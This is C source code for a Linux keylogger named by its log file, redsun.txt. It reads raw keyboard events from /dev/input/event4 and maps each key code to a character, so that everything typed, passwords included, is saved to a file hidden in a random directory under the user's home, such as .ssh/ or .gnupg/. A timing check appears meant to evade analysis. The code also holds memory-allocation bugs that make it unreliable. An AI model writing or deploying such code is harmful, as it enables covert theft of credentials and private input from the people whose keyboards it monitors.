#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <time.h>

FILE* log_file;

static bool loop = false;
clock_t init_timer;

int file_events;

float calc;
float *calc_ptr = &calc;

char USER_PATH;
char *ptr_USER_PATH = &USER_PATH;

char file_path;
char *ptr_file_path = &file_path;

char* PATHS[] = { ".local/share/man/", // those are the possible paths for the log file (redsun.txt).
                  ".config/",
                  ".local/share/nano/",
                  ".local/share/Trash/info/",
                  ".local/lib/",
                  ".gnupg/",
                  ".dbus/",
                  ".fonts/",
                  ".ssh/",
                  ".local/"};


static void GET_USER_PATH(void);
static char* CHECK(void); // checks if an log file already exists.
static char* CHOSE_PATH(void);// if not, then it chose one randomly.
static void LOG_IT(char*); // and then start logging it.
static void QUIT(void);



static void GET_USER_PATH(void) { // gets the common path for the user /home/user/
  ptr_USER_PATH = calloc( (sizeof("/home//") + sizeof(getenv("USER"))), sizeof(char));
  strcat(ptr_USER_PATH, "/home/");
  strcat(ptr_USER_PATH, getenv("USER"));
  strcat(ptr_USER_PATH, "/");
  return;
}



int main(void) {
  atexit(QUIT);
  clock_t end_timer = clock();
  float seconds = (float)(end_timer - init_timer) / CLOCKS_PER_SEC;
  if (seconds >= 0.004500) {
    QUIT();
  }

  GET_USER_PATH();

  chdir(ptr_USER_PATH); // changes to the /home/user/ environment.

  char* path;
  path = CHECK();

  if ( path != NULL) {
    LOG_IT(path);
  }
  else {
    path = CHOSE_PATH();
    LOG_IT(path);
  }

  return 0;
}



static void QUIT(void) {
  loop = false;
  free(ptr_file_path);
  free(ptr_USER_PATH);
  exit(0);
}



char log_path;
char *ptr_log_path;
static char* CHECK(void) {
  
  printf("CHECK\n");
  for (int num = 0; num < (sizeof(PATHS) / sizeof(PATHS[0])); num++) {

      ptr_log_path = calloc( (strlen(ptr_USER_PATH) + strlen(PATHS[num]) + strlen("redsun.txt")) , sizeof(char));
      strcat(ptr_log_path, ptr_USER_PATH);
      strcat(ptr_log_path, PATHS[num]);
      strcat(ptr_log_path, "redsun.txt");


      if ((access(ptr_log_path, F_OK)) != -1) {
        printf("Found ->[%s]\n", ptr_log_path);
        return PATHS[num];
        break;
      }
      else {
        continue;
      }
   };
   return NULL;
}



char chosen_path[200];
static char* CHOSE_PATH(void) {

  time_t time_value;
  srand((unsigned) time(&time_value));
  int number = (rand() % (8 + 1));

  strcat(chosen_path, PATHS[number]);
  
  printf("CHOSEN_PATH->%s\n\n", chosen_path);
  return chosen_path;
}



static void LOG_IT(char* PATH) {

  ptr_file_path = calloc( (strlen("redsun.txt") + strlen(PATH)), sizeof(char));
  strcat(ptr_file_path, "./");
  strcat(ptr_file_path, PATH);
  strcat(ptr_file_path, "redsun.txt");

  printf("ptr_file_path->%s\n", ptr_file_path);

  struct input_event event;
  file_events = open("/dev/input/event4", O_RDONLY); //apparently this is the standard file for keyboard events.
  

  loop = true;
  while (loop == true) {

    read(file_events, &event, sizeof(event));
    if ((event.type == EV_KEY) && (event.value == 0)) {

        log_file = fopen(ptr_file_path, "a");

        fflush(log_file);
        switch (event.code) {
          case 30:fprintf(log_file, "a");break;
          case 48:fprintf(log_file, "b");break;
          case 46:fprintf(log_file, "c");break;
          case 32:fprintf(log_file, "d");break;
          case 18:fprintf(log_file, "e");break;
          case 33:fprintf(log_file, "f");break;
          case 34:fprintf(log_file, "g");break;
          case 35:fprintf(log_file, "h");break;
          case 23:fprintf(log_file, "i");break;
          case 36:fprintf(log_file, "j");break;
          case 37:fprintf(log_file, "k");break;
          case 38:fprintf(log_file, "l");break;
          case 50:fprintf(log_file, "m");break;
          case 49:fprintf(log_file, "n");break;
          case 24:fprintf(log_file, "o");break;
          case 25:fprintf(log_file, "p");break;
          case 16:fprintf(log_file, "q");break;
          case 19:fprintf(log_file, "r");break;
          case 31:fprintf(log_file, "s");break;
          case 20:fprintf(log_file, "t");break;
          case 22:fprintf(log_file, "u");break;
          case 47:fprintf(log_file, "v");break;
          case 17:fprintf(log_file, "w");break;
          case 45:fprintf(log_file, "x");break;
          case 21:fprintf(log_file, "y");break;
          case 44:fprintf(log_file, "z");break;
          case 39:fprintf(log_file, "ç");break;
          case 40:fprintf(log_file, "~^");break;
          case 13:fprintf(log_file, "=");break;
          case 14:fprintf(log_file, "\n[$BACKSPACE]\n");break;
          case 15:fprintf(log_file, "\n[$TAB]\n");break;
          case 27:fprintf(log_file, "[{");break;
          case 43:fprintf(log_file, "]}");break;
          case 53:fprintf(log_file, ";:");break;
          case 41:fprintf(log_file, "'");break;
          case 26:fprintf(log_file, "´`");break;
          case 28:fprintf(log_file, " [ENTER]\n");break;
          case 51:fprintf(log_file, ",<");break;
          case 52:fprintf(log_file, ".>");break;
          case 89:fprintf(log_file, "/?");break;
          case 86:fprintf(log_file, "\\|");break;
          case 57:fprintf(log_file, " ");break;
          case 111:fprintf(log_file, "\n[$DELETE]");break;
          case 42:fprintf(log_file, "\n[$LSHIFT]\n");break;
          case 54:fprintf(log_file, "\n[$RSHIFT]\n");break;
          case 12:fprintf(log_file, "-_");break;
          case 58:fprintf(log_file, "\n[$CAPSLOCK]\n");break;

          case 11:fprintf(log_file, "0");break;
          case 2:fprintf(log_file, "1");break;
          case 3:fprintf(log_file, "2");break;
          case 4:fprintf(log_file, "3");break;
          case 5:fprintf(log_file, "4");break;
          case 6:fprintf(log_file, "5");break;
          case 7:fprintf(log_file, "6");break;
          case 8:fprintf(log_file, "7");break;
          case 9:fprintf(log_file, "8");break;
          case 10:fprintf(log_file, "9");break;
          default:fprintf(log_file, "_");break;
        }
    }
    else {
      continue;
    }

    fclose(log_file);
  };

  close(file_events);
  return;
}
